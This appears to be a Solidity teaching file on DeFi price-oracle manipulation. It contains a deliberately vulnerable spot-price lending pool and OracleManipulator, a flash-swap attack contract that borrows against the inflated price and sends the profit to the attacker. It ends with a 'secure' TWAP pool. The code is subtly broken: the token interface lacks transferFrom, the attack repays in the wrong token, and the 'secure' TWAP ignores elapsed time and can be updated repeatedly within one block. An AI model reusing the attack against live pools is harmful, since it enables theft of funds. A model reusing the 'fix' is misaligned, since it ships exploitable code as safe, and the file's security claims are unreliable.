// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/// @title PriceManipulation - Vulnerable oracle usage
/// @notice Demonstrates oracle manipulation and flash loan attacks
/// @dev DO NOT USE IN PRODUCTION

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @title VulnerableLendingPool - Uses spot price oracle
/// @notice VULNERABLE: Relies on manipulable spot price
contract VulnerableLendingPool {
    IUniswapV2Pair public priceOracle;
    IERC20 public collateralToken;
    IERC20 public borrowToken;

    mapping(address => uint256) public collateralDeposits;
    mapping(address => uint256) public borrowed;

    uint256 public constant COLLATERAL_RATIO = 150; // 150% collateralization

    event CollateralDeposited(address indexed user, uint256 amount);
    event Borrowed(address indexed user, uint256 amount);

    constructor(address _oracle, address _collateral, address _borrow) {
        priceOracle = IUniswapV2Pair(_oracle);
        collateralToken = IERC20(_collateral);
        borrowToken = IERC20(_borrow);
    }

    /// @notice VULNERABLE: Uses spot price from DEX
    /// @dev Can be manipulated with flash loans
    function getPrice() public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = priceOracle.getReserves();

        // VULNERABILITY: Spot price calculation
        // No TWAP, no historical data, can be manipulated in single block
        address token0 = priceOracle.token0();
        if (token0 == address(collateralToken)) {
            return (uint256(reserve1) * 1e18) / uint256(reserve0);
        } else {
            return (uint256(reserve0) * 1e18) / uint256(reserve1);
        }
    }

    function depositCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateralDeposits[msg.sender] += amount;
        emit CollateralDeposited(msg.sender, amount);
    }

    /// @notice VULNERABLE: Borrow amount based on manipulable price
    function borrow(uint256 amount) external {
        uint256 price = getPrice();
        uint256 collateralValue = collateralDeposits[msg.sender] * price / 1e18;
        uint256 maxBorrow = (collateralValue * 100) / COLLATERAL_RATIO;

        require(borrowed[msg.sender] + amount <= maxBorrow, "Insufficient collateral");

        borrowed[msg.sender] += amount;
        borrowToken.transfer(msg.sender, amount);
        emit Borrowed(msg.sender, amount);
    }

    function repay(uint256 amount) external {
        borrowed[msg.sender] -= amount;
        borrowToken.transferFrom(msg.sender, address(this), amount);
    }
}

/// @title OracleManipulator - Flash loan attack
/// @notice Exploits spot price oracle
contract OracleManipulator {
    VulnerableLendingPool public pool;
    IUniswapV2Pair public pair;
    IERC20 public collateralToken;
    IERC20 public borrowToken;

    constructor(address _pool, address _pair) {
        pool = VulnerableLendingPool(_pool);
        pair = IUniswapV2Pair(_pair);
        collateralToken = pool.collateralToken();
        borrowToken = pool.borrowToken();
    }

    /// @notice Execute flash loan attack
    /// @dev Steps:
    /// 1. Flash swap to manipulate price
    /// 2. Deposit collateral at inflated price
    /// 3. Borrow maximum
    /// 4. Repay flash loan
    /// 5. Keep profit
    function attack(uint256 flashAmount) external {
        // Request flash swap from Uniswap
        pair.swap(flashAmount, 0, address(this), abi.encode(msg.sender));
    }

    /// @notice Uniswap callback
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "Not pair");

        // Step 1: We now have flash loaned tokens, price is manipulated
        uint256 originalPrice = pool.getPrice();

        // Step 2: Deposit small collateral
        uint256 collateralAmount = 1000 * 1e18;
        collateralToken.approve(address(pool), collateralAmount);
        pool.depositCollateral(collateralAmount);

        // Step 3: Borrow based on manipulated price
        // Price is now much higher, so we can borrow more
        uint256 maxBorrow = (collateralAmount * pool.getPrice() * 100) / (pool.COLLATERAL_RATIO() * 1e18);
        pool.borrow(maxBorrow);

        // Step 4: Repay flash loan
        uint256 amountToRepay = amount0 * 1004 / 1000; // 0.4% fee
        borrowToken.transfer(address(pair), amountToRepay);

        // Step 5: Profit = maxBorrow - amountToRepay - collateralAmount
        // Send profit to attacker
        address attacker = abi.decode(data, (address));
        uint256 profit = borrowToken.balanceOf(address(this));
        borrowToken.transfer(attacker, profit);
    }
}

/// @title SecureLendingPool - TWAP oracle
/// @notice Uses time-weighted average price
contract SecureLendingPool {
    IUniswapV2Pair public priceOracle;
    IERC20 public collateralToken;
    IERC20 public borrowToken;

    uint256 public constant TWAP_PERIOD = 1 hours;

    struct PriceObservation {
        uint256 timestamp;
        uint256 priceCumulative;
    }

    PriceObservation[] public observations;

    /// @notice SECURE: TWAP price calculation
    /// @dev Cannot be manipulated in single block
    function getPrice() public view returns (uint256) {
        require(observations.length >= 2, "Insufficient price history");

        uint256 currentTime = block.timestamp;
        uint256 oldestIndex = 0;

        // Find observation at least TWAP_PERIOD old
        for (uint256 i = observations.length - 1; i > 0; i--) {
            if (currentTime - observations[i].timestamp >= TWAP_PERIOD) {
                oldestIndex = i;
                break;
            }
        }

        uint256 timeElapsed = currentTime - observations[oldestIndex].timestamp;
        uint256 priceDelta = observations[observations.length - 1].priceCumulative
            - observations[oldestIndex].priceCumulative;

        return priceDelta / timeElapsed;
    }

    /// @notice Update price observation
    /// @dev Called regularly by keeper or on deposits/borrows
    function updatePrice() external {
        (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) = priceOracle.getReserves();

        uint256 price = (uint256(reserve1) * 1e18) / uint256(reserve0);
        uint256 priceCumulative = observations.length > 0
            ? observations[observations.length - 1].priceCumulative + price
            : price;

        observations.push(PriceObservation({
            timestamp: block.timestamp,
            priceCumulative: priceCumulative
        }));

        // Keep max 100 observations
        if (observations.length > 100) {
            for (uint i = 0; i < observations.length - 1; i++) {
                observations[i] = observations[i + 1];
            }
            observations.pop();
        }
    }
}
